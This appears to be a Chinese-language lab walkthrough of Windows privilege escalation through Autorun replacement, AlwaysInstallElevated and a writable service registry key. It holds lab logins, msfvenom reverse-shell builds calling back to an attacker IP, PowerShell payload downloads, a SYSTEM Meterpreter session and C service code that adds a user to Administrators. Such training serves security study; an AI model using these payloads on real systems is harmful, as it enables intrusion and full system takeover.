
# rdp连接
user登录
> rdesktop -u user -p password321 10.10.55.2 -r sound:on -g workarea

TCM登录
> rdesktop -u TCM -p Hacker123 10.10.55.2 -r sound:on -g workarea

# 1.注册表提权-自动运行（ Registry Escalation - Autorun）

## 前提
1. Autorun文件可写（可替换）
2. 需要另一个用户登录才会触发

## 思路
Autorun，就是启动时自动运行，这个思路时通过修改注册表里的二进制文件（用msfvenom生成一个同名的反弹shell文件），替换原有的二进制文件。当其他用户登录系统时，触发注册表里的Autorun文件，从而执行我们替换的payload，然后我们就得到了登录用户的权限。


## 怎么利用?

靶机：
1. 运行Autoruns64.exe检查自动运行的文件。（Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe）
2. 点击登录选项（In Autoruns, click on the ‘Logon’ tab.）
3. 在显示的结果当中，留意“我的程序”指向的二进制文件。（From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.）
4. 用accesschk64.exe检查这个Autorun文件的读写权限。（ In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"）
5. 从上面的检查结果中可以知道所有人对这个Autorun文件有读写权限（From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.）

攻击机：
监听
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

用msfvenom编译同名Autorun文件：

> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.21.169 lport=4444 -f exe -o program.exe


从靶机下载文件program.exe
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/program.exe','C:\Program Files\Autorun Program\program.exe')"

等待用户登录，触发反弹shell。


# 2.注册表提权-AlwaysInstallElevated (Registry Escalation - AlwaysInstallElevated)

## 前提
如果注册表里查询到这两个属性的值都是 0x1，那么任何用户都拥有以``` NT AUTHORITY\SYSTEM```身份运行或者安装```*.msi```文件的权限
>  reg query HKLM\Software\Policies\Microsoft\Windows\Installer

>  reg query HKCU\Software\Policies \Microsoft\Windows\Installer

## 思路
用msfvenom生成一个```*.msi```文件，在靶机里执行这个文件，就可以提权到```NT AUTHORITY\SYSTEM```

## 怎么利用?

### 攻击机：
监听
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

6. 生成反弹的.msi文件
> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.21.169 lport=4444 -f msi -o setup.msi

### 靶机：
7. 从靶机下载文件
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/setup.msi','C:\temp\setup.msi')"

8. 执行```setup.msi```文件

攻击机收到反弹shell，拿到最高权限
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending stage (175174 bytes) to 10.10.86.123
[*] Meterpreter session 2 opened (10.13.21.169:4444 -> 10.10.86.123:49329) at 2021-11-15 09:22:26 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

# 服务提权-注册表（Service Escalation - Registry）

## 前提

使用下面ps命令查看：
> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

满足属于```NT AUTHORITY\INTERACTIVE```的用户拥有```FullContol```的权限

## 思路

如果拥有修改修改服务注册表的权限，那么就可以通过修改这个服务将要执行的二进制文件进行提权。

## 怎么利用?

将```C:\Users\User\Desktop\Tools\Source\windows_service.c```文件拷贝到kail

1. system里面的命令变为：```cmd.exe /k net localgroup administrators user /add```
```
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 



```

2. 编译文件
> x86_64-w64-mingw32-gcc windows_service.c -o x.exe 

3. 把x.exe文件传回靶机。放到```C:\Temp```下面

4. 命令行输入：
>  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

5. 开启服务：
> sc start regsvc

现在查看admin用户组，就可以看到本账户已经被添加到administrators组：
> net localgroup administrators